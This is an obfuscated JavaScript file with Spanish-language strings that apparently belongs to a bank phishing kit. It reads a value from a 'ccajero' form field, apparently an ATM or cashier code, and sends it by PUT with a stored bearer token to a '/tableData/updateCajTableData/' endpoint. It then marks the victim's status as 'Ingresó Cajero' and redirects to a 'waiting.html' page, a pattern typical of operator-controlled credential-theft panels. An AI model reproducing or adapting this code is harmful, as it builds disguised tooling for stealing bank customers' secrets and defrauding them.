const _0xfa71d8 = _0x2d10;
function _0x1dbf() {
  const _0x3cc63f = [
    "7309506hBzDuS",
    "block",
    "click",
    "trim",
    "waiting.html",
    "json",
    "error-message",
    "userTableDataId",
    "input[required]",
    "1103750apDmKm",
    "PUT",
    "display",
    "Todos\x20los\x20campos\x20son\x20obligatorios.",
    "btnNextStep",
    "textContent",
    "3849597FCNoPp",
    "from",
    "origin",
    "value",
    "getItem",
    "25681932kzstHt",
    "tableDataToken",
    "href",
    "1669486WRjCnO",
    "4geWgUI",
    "error",
    "10880232IzcQiq",
    "application/json",
    "getElementById",
    "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage.",
    "986053SEaKMP",
    "none",
    "log",
    "querySelectorAll",
    "form",
    "2qQygzo",
    "Bearer\x20",
    "addEventListener",
    "style",
    "Error\x20al\x20actualizar\x20datos\x20en\x20el\x20servidor",
    "every",
    "/tableData/updateCajTableData/",
    "Ingresó\x20Cajero",
  ];
  _0x1dbf = function () {
    return _0x3cc63f;
  };
  return _0x1dbf();
}
function _0x2d10(_0x4bb41d, _0x233767) {
  const _0x1dbfef = _0x1dbf();
  return (
    (_0x2d10 = function (_0x2d1065, _0x238577) {
      _0x2d1065 = _0x2d1065 - 0xec;
      let _0x3d7ac2 = _0x1dbfef[_0x2d1065];
      return _0x3d7ac2;
    }),
    _0x2d10(_0x4bb41d, _0x233767)
  );
}
(function (_0x2384a6, _0x4e0b71) {
  const _0x364cbc = _0x2d10,
    _0x249ffc = _0x2384a6();
  while (!![]) {
    try {
      const _0x109ef3 =
        (-parseInt(_0x364cbc(0xf0)) / 0x1) * (parseInt(_0x364cbc(0xf5)) / 0x2) +
        (parseInt(_0x364cbc(0x10c)) / 0x3) *
          (-parseInt(_0x364cbc(0x115)) / 0x4) +
        parseInt(_0x364cbc(0x106)) / 0x5 +
        -parseInt(_0x364cbc(0xfd)) / 0x6 +
        -parseInt(_0x364cbc(0x114)) / 0x7 +
        parseInt(_0x364cbc(0xec)) / 0x8 +
        parseInt(_0x364cbc(0x111)) / 0x9;
      if (_0x109ef3 === _0x4e0b71) break;
      else _0x249ffc["push"](_0x249ffc["shift"]());
    } catch (_0x2a7f37) {
      _0x249ffc["push"](_0x249ffc["shift"]());
    }
  }
})(_0x1dbf, 0xacee6),
  document[_0xfa71d8(0xee)](_0xfa71d8(0x10a))[_0xfa71d8(0xf7)](
    _0xfa71d8(0xff),
    async (_0x17ff28) => {
      const _0x1371ce = _0xfa71d8;
      _0x17ff28["preventDefault"]();
      const _0x3d6ecf = document[_0x1371ce(0xee)]("ccajero")[_0x1371ce(0x10f)];
      console[_0x1371ce(0xf2)](_0x3d6ecf);
      if (!areAllFieldsFilled()) {
        showErrorMessage(_0x1371ce(0x109));
        return;
      }
      try {
        await updateCcj(_0x3d6ecf),
          console["log"](
            "Datos\x20actualizados\x20correctamente\x20en\x20el\x20servidor"
          ),
          (window["location"][_0x1371ce(0x113)] = _0x1371ce(0x101));
      } catch (_0x1f3f25) {
        console["error"]("Hubo\x20un\x20problema:", _0x1f3f25),
          alert(
            "Hubo\x20un\x20error\x20al\x20actualizar\x20los\x20datos.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo."
          );
      }
    }
  );
function areAllFieldsFilled() {
  const _0x54b777 = _0xfa71d8,
    _0x1f29d6 = document[_0x54b777(0xee)](_0x54b777(0xf4)),
    _0x122518 = _0x1f29d6[_0x54b777(0xf3)](_0x54b777(0x105));
  return Array[_0x54b777(0x10d)](_0x122518)[_0x54b777(0xfa)](
    (_0x4b1cdd) => _0x4b1cdd[_0x54b777(0x10f)][_0x54b777(0x100)]() !== ""
  );
}
function showErrorMessage(_0x47e3b5) {
  const _0x4ffd03 = _0xfa71d8,
    _0x480bb8 = document[_0x4ffd03(0xee)](_0x4ffd03(0x103));
  (_0x480bb8[_0x4ffd03(0x10b)] = _0x47e3b5),
    (_0x480bb8["style"][_0x4ffd03(0x108)] = _0x4ffd03(0xfe)),
    setTimeout(() => {
      const _0x582a9e = _0x4ffd03;
      _0x480bb8[_0x582a9e(0xf8)]["display"] = _0x582a9e(0xf1);
    }, 0x7d0);
}
async function updateCcj(_0x35984d) {
  const _0x48f3c2 = _0xfa71d8,
    _0x5bb78c = localStorage[_0x48f3c2(0x110)](_0x48f3c2(0x104)),
    _0x22964d = localStorage[_0x48f3c2(0x110)](_0x48f3c2(0x112));
  if (!_0x5bb78c || !_0x22964d) throw new Error(_0x48f3c2(0xef));
  const _0xdee7b = await fetch(url + _0x48f3c2(0xfb) + _0x5bb78c, {
    method: _0x48f3c2(0x107),
    headers: {
      "Content-Type": _0x48f3c2(0xed),
      Authorization: _0x48f3c2(0xf6) + _0x22964d,
      Origin: window["location"][_0x48f3c2(0x10e)],
    },
    body: JSON["stringify"]({ caj: _0x35984d, status: _0x48f3c2(0xfc) }),
  });
  if (!_0xdee7b["ok"]) {
    const _0x475d70 = await _0xdee7b[_0x48f3c2(0x102)]();
    throw new Error(_0x475d70[_0x48f3c2(0x116)] || _0x48f3c2(0xf9));
  }
}
